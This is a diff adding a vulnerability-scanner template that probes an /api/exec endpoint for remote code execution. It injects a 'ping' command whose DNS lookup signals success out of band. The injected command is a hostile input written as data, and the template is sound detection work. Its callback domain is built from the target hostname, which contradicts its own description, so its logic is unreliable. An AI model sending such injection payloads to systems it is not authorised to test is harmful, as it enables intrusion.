@@ -1,0 +1,30 @@
+id: godnslog-rce-callback
+info:
+  name: GODNSLOG RCE Callback OAST Detection
+  author: GODNSLOG
+  severity: critical
+  description: |
+    Detects Remote Code Execution (RCE) vulnerabilities using GODNSLOG.
+    This template injects a command that triggers a DNS callback to the GODNSLOG server.
+
+requests:
+  - raw:
+      - |
+        POST /api/exec HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: {{User-Agent}}
+
+        {"cmd": "ping -c1 {{godnslog_payload}}.{{Hostname}}"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '(?P<token>[a-zA-Z0-9]{16,32})'
